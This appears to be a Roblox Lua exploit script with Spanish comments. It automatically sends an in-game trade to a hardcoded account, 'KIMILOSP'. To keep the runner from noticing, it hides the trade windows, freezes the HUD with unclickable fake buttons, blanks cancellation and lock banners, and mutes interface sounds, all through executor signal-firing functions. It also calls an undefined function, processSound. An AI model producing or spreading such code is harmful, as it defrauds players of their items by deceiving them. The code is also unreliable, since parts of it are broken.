local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")

local okVim, VirtualInputManager = pcall(function()
	return game:GetService("VirtualInputManager")
end)

local TARGET_USERNAME = "KIMILOSP"
local TARGET_USER_ID = "9555775328"

local HIDE_TRADE_UI = true
local USE_STATIC_LEFT_GUI = true
local HIDE_REAL_LEFT_BUTTONS = true
local BLOCK_MANUAL_LEFT_CLICKS = true
local DESTROY_BLUR_AND_ZOOM = true
local MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT = true
local HIDE_SECTION_BANNER_TEXTS = true
local AUTO_SEND_TRADE = true
local RETRY_DELAY = 0.4
local MAX_ATTEMPTS = 35

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

local hiddenState = {}
local hiddenRealButtons = {}
local staticBlockers = {}
local clearedBannerTexts = {}
local watchedTradeConnections = {}
local defaultFov = 70

local cam = workspace.CurrentCamera
if cam then
	defaultFov = cam.FieldOfView
end

-- Coordenadas exactas ajustadas en pantalla (102x102 cada uno)
local EXACT_HUD_BUTTONS = {
	{ name = "Shop",                   x = 81,  y = 420, w = 102, h = 102, label = "Shop" },
	{ name = "Rebirth",                x = 196, y = 422, w = 102, h = 102, label = "Rebirth" },
	{ name = "Index",                  x = 81,  y = 537, w = 102, h = 102, label = "Index" },
	{ name = "DuelsMachinePlayerList", x = 198, y = 538, w = 102, h = 102, label = "Duels" },
	{ name = "TradePlayerList",        x = 81,  y = 655, w = 102, h = 102, label = "Trade" },
	{ name = "Codes",                  x = 198, y = 655, w = 102, h = 102, label = "Codes" },
}

local staticGui = Instance.new("ScreenGui")
staticGui.Name = "SabStaticLeftHudGui"
staticGui.ResetOnSpawn = false
staticGui.IgnoreGuiInset = true
staticGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
staticGui.DisplayOrder = 2147483647
staticGui.Enabled = USE_STATIC_LEFT_GUI
staticGui.Parent = playerGui

-- Filtro exacto de sonidos (sin lag):
-- 1) Compra de Brainrots
-- 2) Dinero al recolectar Brainrots en bases
-- Todo lo demas se silencia al instante.
local DEBUG_LOG_PLAYED_SOUNDS = false
local soundMeta = setmetatable({}, { __mode = "k" })

local function getSoundPathBlob(snd)
	local names = {
		tostring(snd.Name or ""),
		tostring(snd.SoundId or ""),
	}
	local cur = snd.Parent
	local step = 0
	while cur and cur ~= game and step < 10 do
		table.insert(names, tostring(cur.Name or ""))
		cur = cur.Parent
		step += 1
	end
	return table.concat(names, "/"):lower()
end

local function isInsideBlockedUiOrTrade(snd)
	local cur = snd.Parent
	local step = 0
	while cur and cur ~= game and step < 10 do
		if cur:IsA("GuiButton") then
			return true
		end
		local n = tostring(cur.Name or ""):lower()
		if n:find("trade", 1, true)
			or n:find("intercambio", 1, true)
			or n:find("playerlist", 1, true)
			or n:find("search", 1, true)
			or n:find("buscar", 1, true)
		then
			return true
		end
		cur = cur.Parent
		step += 1
	end
	return false
end

local function isExactWantedSound(snd)
	if not snd or not snd:IsA("Sound") then return false end
	if isInsideBlockedUiOrTrade(snd) then return false end

	local path = getSoundPathBlob(snd)

	-- Bloquea explícitamente UI, clics, menús, trades, búsquedas, música y ambiente
	if path:find("click", 1, true)
		or path:find("button", 1, true)
		or path:find("hover", 1, true)
		or path:find("press", 1, true)
		or path:find("open", 1, true)
		or path:find("close", 1, true)
		or path:find("menu", 1, true)
		or path:find("trade", 1, true)
		or path:find("intercambio", 1, true)
		or path:find("playerlist", 1, true)
		or path:find("search", 1, true)
		or path:find("buscar", 1, true)
		or path:find("music", 1, true)
		or path:find("bgm", 1, true)
		or path:find("ambient", 1, true)
	then
		return false
	end

	-- 1) Sonido al comprar Brainrots (pasarela/conveyor/compra/brainrot)
	local isBrainrotBuy = (path:find("brainrot", 1, true) ~= nil)
		or (path:find("conveyor", 1, true) ~= nil)
		or (path:find("pasarela", 1, true) ~= nil)
		or (path:find("buy", 1, true) ~= nil)
		or (path:find("purchase", 1, true) ~= nil)
		or (path:find("comprar", 1, true) ~= nil)

	-- 2) Sonido de dinero al recolectar en bases
	local isBaseMoneyCollect = (path:find("money", 1, true) ~= nil)
		or (path:find("cash", 1, true) ~= nil)
		or (path:find("coin", 1, true) ~= nil)
		or (path:find("dinero", 1, true) ~= nil)
		or (path:find("collect", 1, true) ~= nil)
		or (path:find("claim", 1, true) ~= nil)
		or (path:find("income", 1, true) ~= nil)
		or (path:find("base", 1, true) ~= nil)
		or (path:find("plot", 1, true) ~= nil)

	return isBrainrotBuy or isBaseMoneyCollect
end

local function silenceNow(snd)
	pcall(function()
		snd.Volume = 0
		snd.Playing = false
		snd:Stop()
	end)
end

local function restoreVolumeIfWanted(snd, entry)
	pcall(function()
		if snd.Volume <= 0 then
			snd.Volume = entry.vol
		end
	end)
end

local function handleSoundInstance(snd)
	if not MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT or not snd or not snd:IsA("Sound") then return end

	local entry = soundMeta[snd]
	if not entry then
		local baseVol = snd.Volume > 0 and snd.Volume or 0.65
		entry = {
			vol = baseVol,
			hooked = false,
		}
		soundMeta[snd] = entry
	end

	if isExactWantedSound(snd) then
		restoreVolumeIfWanted(snd, entry)
	else
		silenceNow(snd)
	end

	if not entry.hooked then
		entry.hooked = true
		snd.Played:Connect(function()
			if not MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT then return end
			if isExactWantedSound(snd) then
				restoreVolumeIfWanted(snd, entry)
				if DEBUG_LOG_PLAYED_SOUNDS then
					print("[SOUND ALLOWED]", snd:GetFullName(), snd.SoundId, snd.Volume)
				end
			else
				silenceNow(snd)
			end
		end)
		snd:GetPropertyChangedSignal("Playing"):Connect(function()
			if MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT and snd.Playing and not isExactWantedSound(snd) then
				silenceNow(snd)
			end
		end)
	end
end

local function muteButtonTradeAndSearchSounds()
	if not MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT then return end
	for _, desc in ipairs(playerGui:GetDescendants()) do
		if desc:IsA("Sound") then
			handleSoundInstance(desc)
		end
	end
end

local function filterGuiSounds()
	if not MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT then return end
	for _, desc in ipairs(playerGui:GetDescendants()) do
		if desc:IsA("Sound") then
			handleSoundInstance(desc)
		end
	end
	for _, desc in ipairs(SoundService:GetDescendants()) do
		if desc:IsA("Sound") then
			handleSoundInstance(desc)
		end
	end
end

playerGui.DescendantAdded:Connect(function(desc)
	if MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT and desc:IsA("Sound") then
		task.defer(function()
			if desc and desc.Parent then
				handleSoundInstance(desc)
			end
		end)
	end
end)

SoundService.DescendantAdded:Connect(function(desc)
	if MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT and desc:IsA("Sound") then
		task.defer(function()
			if desc and desc.Parent then
				handleSoundInstance(desc)
			end
		end)
	end
end)

workspace.DescendantAdded:Connect(function(desc)
	if MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT and desc:IsA("Sound") then
		task.defer(function()
			if desc and desc.Parent then
				handleSoundInstance(desc)
			end
		end)
	end
end)

-- Solo textos de la sección/banner de cierre de interfaz o bloqueo de base (ej: "@KIMILOSP canceló")
local function isTargetSectionBannerText(txt)
	if type(txt) ~= "string" or txt == "" then return false end
	local t = txt:lower()

	if t:find("canceló", 1, true)
		or t:find("cancelo", 1, true)
		or t:find("cancelled", 1, true)
		or t:find("canceled", 1, true)
		or t:find("base bloqueada", 1, true)
		or t:find("base locked", 1, true)
		or t:find("lock base", 1, true)
		or t:find("bloquear base", 1, true)
	then
		return true
	end

	if t:find("@", 1, true) and (t:find("cancel", 1, true) or t:find("cerr", 1, true) or t:find("lock", 1, true) or t:find("bloq", 1, true)) then
		return true
	end

	return false
end

local function isInsideBannerOrNotification(obj)
	local curr = obj.Parent
	local depth = 0
	while curr and curr ~= playerGui and depth < 6 do
		local n = tostring(curr.Name or ""):lower()
		if n:find("notif", 1, true)
			or n:find("banner", 1, true)
			or n:find("toast", 1, true)
			or n:find("alert", 1, true)
			or n:find("popup", 1, true)
			or n:find("announce", 1, true)
			or n:find("status", 1, true)
		then
			return true
		end
		curr = curr.Parent
		depth += 1
	end
	return false
end

local function maybeClearBannerTextObj(desc)
	if not HIDE_SECTION_BANNER_TEXTS or not desc or desc:IsDescendantOf(staticGui) then return end
	if not (desc:IsA("TextLabel") or desc:IsA("TextButton")) then return end

	local shouldClear = isTargetSectionBannerText(desc.Text)
	if not shouldClear and isInsideBannerOrNotification(desc) then
		local lowerT = tostring(desc.Text or ""):lower()
		if lowerT:find("cancel", 1, true) or lowerT:find("bloq", 1, true) or lowerT:find("lock", 1, true) then
			shouldClear = true
		end
	end

	if shouldClear then
		if clearedBannerTexts[desc] == nil then
			clearedBannerTexts[desc] = desc.Text
		end
		if desc.Text ~= "" then
			pcall(function()
				desc.Text = ""
			end)
		end
	end
end

local function cleanSectionBannerTexts()
	if not HIDE_SECTION_BANNER_TEXTS then
		for obj, origText in pairs(clearedBannerTexts) do
			if obj and obj.Parent then
				pcall(function()
					obj.Text = origText
				end)
			end
		end
		table.clear(clearedBannerTexts)
		return
	end

	for _, desc in ipairs(playerGui:GetDescendants()) do
		maybeClearBannerTextObj(desc)
	end
end

local function findButtonsContainer()
	local leftCenter = playerGui:FindFirstChild("LeftCenter", true)
	if leftCenter then
		local buttonsFolder = leftCenter:FindFirstChild("Buttons", true)
		if buttonsFolder then
			return buttonsFolder
		end
		return leftCenter
	end
	return nil
end

local function findExactSourceButton(container, spec)
	if not container then return nil end

	local direct = container:FindFirstChild(spec.name, true)
	if direct and direct:IsA("GuiObject") then
		return direct
	end

	local lowerTarget = spec.label:lower()
	for _, desc in ipairs(container:GetDescendants()) do
		if desc:IsA("GuiObject") and desc.AbsoluteSize.X >= 60 and desc.AbsoluteSize.Y >= 60 then
			if desc.Name:lower() == spec.name:lower() then
				return desc
			end
			for _, sub in ipairs(desc:GetDescendants()) do
				if (sub:IsA("TextLabel") or sub:IsA("TextButton")) and sub.Text:lower() == lowerTarget then
					return desc
				end
			end
		end
	end

	return nil
end

local function hideRealButtonObj(desc)
	if not desc or desc:IsDescendantOf(staticGui) or not desc:IsA("GuiButton") then return end
	if HIDE_REAL_LEFT_BUTTONS then
		if hiddenRealButtons[desc] == nil then
			hiddenRealButtons[desc] = {
				Visible = desc.Visible,
				Active = desc.Active,
			}
		end
		if desc.Visible or desc.Active then
			pcall(function()
				desc.Visible = false
				desc.Active = false
			end)
		end
	elseif hiddenRealButtons[desc] ~= nil then
		local prev = hiddenRealButtons[desc]
		hiddenRealButtons[desc] = nil
		pcall(function()
			desc.Visible = prev.Visible
			desc.Active = prev.Active
		end)
	end
end

local function syncRealClickableLeftButtons()
	local container = findButtonsContainer()
	if not container then return end

	for _, desc in ipairs(container:GetDescendants()) do
		hideRealButtonObj(desc)
	end
end

local function buildExactHudFromScanOnce()
	for _, ch in ipairs(staticGui:GetChildren()) do
		ch:Destroy()
	end
	table.clear(staticBlockers)

	local container = findButtonsContainer()

	for idx, spec in ipairs(EXACT_HUD_BUTTONS) do
		local orig = findExactSourceButton(container, spec)

		local posX = spec.x
		local posY = spec.y
		local sizeX = spec.w
		local sizeY = spec.h
		local clonedVisual

		if orig then
			if orig.AbsoluteSize.X > 0 and orig.AbsoluteSize.Y > 0 then
				sizeX = orig.AbsoluteSize.X
				sizeY = orig.AbsoluteSize.Y
			end

			orig.Archivable = true
			local ok, copy = pcall(function()
				return orig:Clone()
			end)

			if ok and copy then
				for _, d in ipairs(copy:GetDescendants()) do
					if d:IsA("Script") or d:IsA("LocalScript") or d:IsA("Sound") then
						d:Destroy()
					elseif d:IsA("GuiObject") then
						d.Active = false
					end
				end
				if copy:IsA("GuiObject") then
					copy.Active = false
					copy.Visible = true
				end
				copy.Name = "ExactClone_" .. spec.name
				copy.Position = UDim2.fromOffset(0, 0)
				copy.Size = UDim2.fromScale(1, 1)
				copy.ZIndex = 95
				clonedVisual = copy
			end
		end

		local slot = Instance.new("Frame")
		slot.Name = "StaticSlot_" .. idx .. "_" .. spec.name
		slot.Position = UDim2.fromOffset(posX, posY)
		slot.Size = UDim2.fromOffset(sizeX, sizeY)
		slot.BackgroundTransparency = clonedVisual and 1 or 0
		slot.BackgroundColor3 = Color3.fromRGB(68, 88, 102)
		slot.BorderSizePixel = 0
		slot.ZIndex = 95
		slot.Parent = staticGui

		if clonedVisual then
			clonedVisual.Parent = slot
		else
			local lbl = Instance.new("TextLabel")
			lbl.Size = UDim2.fromScale(1, 1)
			lbl.BackgroundTransparency = 1
			lbl.Text = spec.label
			lbl.TextColor3 = Color3.new(1, 1, 1)
			lbl.TextScaled = true
			lbl.Font = Enum.Font.GothamBlack
			lbl.ZIndex = 96
			lbl.Parent = slot
		end

		local blocker = Instance.new("TextButton")
		blocker.Name = "StaticBlocker_" .. idx .. "_" .. spec.name
		blocker.Size = UDim2.fromScale(1, 1)
		blocker.Text = ""
		blocker.BackgroundTransparency = 1
		blocker.AutoButtonColor = false
		blocker.Active = BLOCK_MANUAL_LEFT_CLICKS
		blocker.BorderSizePixel = 0
		blocker.ZIndex = 100
		blocker.Parent = slot

		blocker.MouseButton1Click:Connect(function()
			muteButtonTradeAndSearchSounds()
			if BLOCK_MANUAL_LEFT_CLICKS then
				warn("[STATIC LEFT HUD] Clic manual bloqueado en: " .. spec.label)
			end
		end)

		table.insert(staticBlockers, blocker)
	end

	syncRealClickableLeftButtons()
end

buildExactHudFromScanOnce()

-- Mantiene staticGui siempre firme y sin parpadear durante el ciclo
local function keepFrozenHudAlwaysOn()
	if staticGui.Enabled ~= USE_STATIC_LEFT_GUI then
		staticGui.Enabled = USE_STATIC_LEFT_GUI
	end
	for _, blocker in ipairs(staticBlockers) do
		if blocker.Active ~= BLOCK_MANUAL_LEFT_CLICKS then
			blocker.Active = BLOCK_MANUAL_LEFT_CLICKS
		end
	end
end

local function destroyEffectObject(obj)
	pcall(function()
		obj.Enabled = false
		if obj:IsA("BlurEffect") then
			obj.Size = 0
		elseif obj:IsA("DepthOfFieldEffect") then
			obj.FarIntensity = 0
			obj.NearIntensity = 0
			obj.FocusDistance = 0
			obj.InFocusRadius = 0
		end
		obj:Destroy()
	end)
end

local function cleanBlurAndZoom()
	if not DESTROY_BLUR_AND_ZOOM then return end

	for _, obj in ipairs(Lighting:GetDescendants()) do
		if obj:IsA("BlurEffect") or obj:IsA("DepthOfFieldEffect") then
			destroyEffectObject(obj)
		end
	end

	local currentCam = workspace.CurrentCamera
	if currentCam then
		for _, obj in ipairs(currentCam:GetDescendants()) do
			if obj:IsA("BlurEffect") or obj:IsA("DepthOfFieldEffect") then
				destroyEffectObject(obj)
			end
		end
		pcall(function()
			if math.abs(currentCam.FieldOfView - defaultFov) > 0.05 then
				currentCam.FieldOfView = defaultFov
			end
		end)
	end
end

Lighting.DescendantAdded:Connect(function(desc)
	if DESTROY_BLUR_AND_ZOOM and (desc:IsA("BlurEffect") or desc:IsA("DepthOfFieldEffect")) then
		destroyEffectObject(desc)
	end
end)

local function bindCameraListeners(targetCam)
	if not targetCam then return end
	defaultFov = targetCam.FieldOfView
	targetCam.DescendantAdded:Connect(function(desc)
		if DESTROY_BLUR_AND_ZOOM and (desc:IsA("BlurEffect") or desc:IsA("DepthOfFieldEffect")) then
			destroyEffectObject(desc)
		end
	end)
	targetCam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
		if DESTROY_BLUR_AND_ZOOM and math.abs(targetCam.FieldOfView - defaultFov) > 0.05 then
			pcall(function()
				targetCam.FieldOfView = defaultFov
			end)
		end
	end)
end

if cam then
	bindCameraListeners(cam)
end

workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
	cam = workspace.CurrentCamera
	bindCameraListeners(cam)
	cleanBlurAndZoom()
end)

local function isTradeGuiOrFrame(inst)
	if not inst then return false end
	local n = inst.Name:lower()
	if n:find("trade") or n:find("intercambio") then
		return true
	end
	for _, d in ipairs(inst:GetDescendants()) do
		if d:IsA("TextLabel") or d:IsA("TextButton") then
			local t = d.Text:lower()
			if t:find("your offer") or t:find("chat de intercambio") or t:find("selecciona brainrots") then
				return true
			end
		end
	end
	return false
end

local function setHidden(inst, hide)
	if not inst or not inst.Parent then return end
	if hide then
		if hiddenState[inst] == nil then
			pcall(function()
				if inst:IsA("LayerCollector") then
					hiddenState[inst] = inst.Enabled
					inst.Enabled = false
				elseif inst:IsA("GuiObject") then
					hiddenState[inst] = inst.Visible
					inst.Visible = false
				end
			end)
		else
			pcall(function()
				if inst:IsA("LayerCollector") and inst.Enabled then
					inst.Enabled = false
				elseif inst:IsA("GuiObject") and inst.Visible then
					inst.Visible = false
				end
			end)
		end
	elseif hiddenState[inst] ~= nil then
		local prev = hiddenState[inst]
		hiddenState[inst] = nil
		pcall(function()
			if inst:IsA("LayerCollector") then
				inst.Enabled = prev
			elseif inst:IsA("GuiObject") then
				inst.Visible = prev
			end
		end)
	end
end

local function watchTradeInstantHide(inst)
	if not inst or watchedTradeConnections[inst] then return end
	local conns = {}
	if inst:IsA("LayerCollector") then
		table.insert(conns, inst:GetPropertyChangedSignal("Enabled"):Connect(function()
			if HIDE_TRADE_UI and inst.Enabled then
				setHidden(inst, true)
			end
		end))
	elseif inst:IsA("GuiObject") then
		table.insert(conns, inst:GetPropertyChangedSignal("Visible"):Connect(function()
			if HIDE_TRADE_UI and inst.Visible then
				setHidden(inst, true)
			end
		end))
	end
	watchedTradeConnections[inst] = conns
end

local function syncTradeVisibility()
	local leftCenter = playerGui:FindFirstChild("LeftCenter", true)
	local leftScreenGui = leftCenter and leftCenter:FindFirstAncestorWhichIsA("LayerCollector")

	for _, child in ipairs(playerGui:GetChildren()) do
		if child ~= staticGui and child ~= leftScreenGui and child ~= leftCenter then
			local n = child.Name:lower()
			if n:find("trade") or n:find("intercambio") then
				watchTradeInstantHide(child)
				setHidden(child, HIDE_TRADE_UI)
			else
				for _, sub in ipairs(child:GetChildren()) do
					if sub ~= leftCenter and isTradeGuiOrFrame(sub) then
						watchTradeInstantHide(sub)
						setHidden(sub, HIDE_TRADE_UI)
					end
				end
			end
		end
	end

	if not HIDE_TRADE_UI then
		for inst in pairs(hiddenState) do
			setHidden(inst, false)
		end
	end
end

playerGui.DescendantAdded:Connect(function(desc)
	if desc == staticGui or desc:IsDescendantOf(staticGui) then return end

	if MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT and desc:IsA("Sound") then
		processSound(desc)
	end

	if HIDE_SECTION_BANNER_TEXTS then
		maybeClearBannerTextObj(desc)
	end

	if HIDE_REAL_LEFT_BUTTONS and desc:IsA("GuiButton") then
		local container = findButtonsContainer()
		if container and desc:IsDescendantOf(container) then
			hideRealButtonObj(desc)
		end
	end

	if HIDE_TRADE_UI and isTradeGuiOrFrame(desc) then
		watchTradeInstantHide(desc)
		setHidden(desc, true)
	end
end)

local function resolveClickableButton(inst)
	if not inst then return nil end
	if inst:IsA("GuiButton") then return inst end

	local btnDesc = inst:FindFirstChildWhichIsA("GuiButton", true)
	if btnDesc then return btnDesc end

	local curr = inst.Parent
	while curr and curr ~= playerGui do
		if curr:IsA("GuiButton") then return curr end
		curr = curr.Parent
	end
	return nil
end

local function fireGuiSignals(btn)
	if not btn then return false end
	local triggered = false
	muteButtonTradeAndSearchSounds()

	if firesignal then
		pcall(function()
			if btn.MouseButton1Down then firesignal(btn.MouseButton1Down) end
		end)
		pcall(function()
			if btn.MouseButton1Click then firesignal(btn.MouseButton1Click); triggered = true end
		end)
		pcall(function()
			if btn.Activated then firesignal(btn.Activated); triggered = true end
		end)
	end

	if getconnections then
		for _, sigName in ipairs({ "MouseButton1Click", "Activated", "MouseButton1Down" }) do
			local ok, conns = pcall(function()
				return getconnections(btn[sigName])
			end)
			if ok and type(conns) == "table" then
				for _, conn in ipairs(conns) do
					if conn.Function and pcall(conn.Function) then
						triggered = true
					end
				end
			end
		end
	end

	if not triggered and btn:IsA("GuiButton") then
		pcall(function()
			GuiService.SelectedObject = btn
		end)
	end

	return triggered
end

-- Dispara sin apagar staticGui para evitar parpadeo de los botones falsos
local function triggerScriptButton(inst)
	local btn = resolveClickableButton(inst) or inst
	if not btn then return false end

	keepFrozenHudAlwaysOn()
	local ok = fireGuiSignals(btn)
	task.wait(0.05)
	keepFrozenHudAlwaysOn()
	return ok
end

local function pressEnterOnSearchBox(box, textToType)
	if not box or not box:IsA("TextBox") then return false end
	return pcall(function()
		box:CaptureFocus()
		box.Text = textToType
		task.wait(0.05)
		if okVim and VirtualInputManager then
			pcall(function()
				VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
				task.wait(0.03)
				VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
			end)
		end
		if box.FocusLost then
			pcall(function() box.FocusLost:Fire(true) end)
		end
		box:ReleaseFocus()
	end)
end

local function findLeftTradeButton()
	local leftCenter = playerGui:FindFirstChild("LeftCenter", true)
	if leftCenter then
		local exact = leftCenter:FindFirstChild("TradePlayerList", true)
		if exact then return resolveClickableButton(exact) or exact end
	end
	return nil
end

local function findSearchBox(root)
	if not root then return nil end
	for _, desc in ipairs(root:GetDescendants()) do
		if desc:IsA("TextBox") then
			return desc
		end
	end
	return nil
end

local function findTargetSendButton(root, targetName, targetId)
	if not root then return nil end
	local lowerTarget = targetName:lower()
	local exactRowName = lowerTarget .. "_" .. tostring(targetId)

	for _, desc in ipairs(root:GetDescendants()) do
		local dn = desc.Name:lower()
		if dn == exactRowName or dn:find(lowerTarget, 1, true) then
			local sendInst = desc:FindFirstChild("Send", true)
			if sendInst then return resolveClickableButton(sendInst) or sendInst end
			for _, sub in ipairs(desc:GetDescendants()) do
				if sub.Name:lower():find("send") or sub.Name:lower():find("enviar") then
					return resolveClickableButton(sub) or sub
				end
			end
		end
	end
	return nil
end

local function findCloseButton(root)
	if not root then return nil end
	for _, desc in ipairs(root:GetDescendants()) do
		local n = desc.Name:lower()
		if n == "x" or n == "close" or n:find("close") then
			local btn = resolveClickableButton(desc)
			if btn then return btn end
		end
		if (desc:IsA("TextButton") or desc:IsA("TextLabel")) and desc.Text:gsub("%s+", ""):lower() == "x" then
			return resolveClickableButton(desc) or desc
		end
	end
	return nil
end

local function sendTradeToPlayerByClicks(targetName, targetId)
	targetName = targetName or TARGET_USERNAME
	targetId = targetId or TARGET_USER_ID
	syncTradeVisibility()
	cleanSectionBannerTexts()
	filterGuiSounds()

	local sent = false
	local closed = false

	for attempt = 1, MAX_ATTEMPTS do
		keepFrozenHudAlwaysOn()
		local tradeListGui = playerGui:FindFirstChild("TradePlayerList")
		local sendBtn = findTargetSendButton(tradeListGui or playerGui, targetName, targetId)

		if not sendBtn then
			local openBtn = findLeftTradeButton()
			if openBtn then
				triggerScriptButton(openBtn)
				task.wait(RETRY_DELAY)
				syncTradeVisibility()
				tradeListGui = playerGui:FindFirstChild("TradePlayerList")
			end

			local searchBox = findSearchBox(tradeListGui or playerGui)
			if searchBox then
				pressEnterOnSearchBox(searchBox, targetName)
				task.wait(RETRY_DELAY)
			end

			sendBtn = findTargetSendButton(tradeListGui or playerGui, targetName, targetId)
		end

		if sendBtn and not sent then
			triggerScriptButton(sendBtn)
			sent = true
			task.wait(RETRY_DELAY)
		end

		if sent and not closed then
			local closeBtn = findCloseButton(tradeListGui or playerGui)
			if closeBtn then
				triggerScriptButton(closeBtn)
				closed = true
				break
			elseif attempt >= 12 then
				break
			end
		end

		task.wait(RETRY_DELAY)
	end

	syncTradeVisibility()
	cleanSectionBannerTexts()
	return sent
end

-- Limpieza inicial única y mantenimiento ligero sin saturar FPS
cleanBlurAndZoom()
syncTradeVisibility()
syncRealClickableLeftButtons()
cleanSectionBannerTexts()
filterGuiSounds()

task.spawn(function()
	while true do
		task.wait(0.6)
		keepFrozenHudAlwaysOn()
		syncTradeVisibility()
		cleanSectionBannerTexts()
	end
end)

if AUTO_SEND_TRADE then
	task.spawn(function()
		task.wait(0.5)
		local ok = sendTradeToPlayerByClicks(TARGET_USERNAME, TARGET_USER_ID)
		print("[TRADE CLICK FLOW] Resultado envio a " .. TARGET_USERNAME .. ":", tostring(ok))
	end)
end
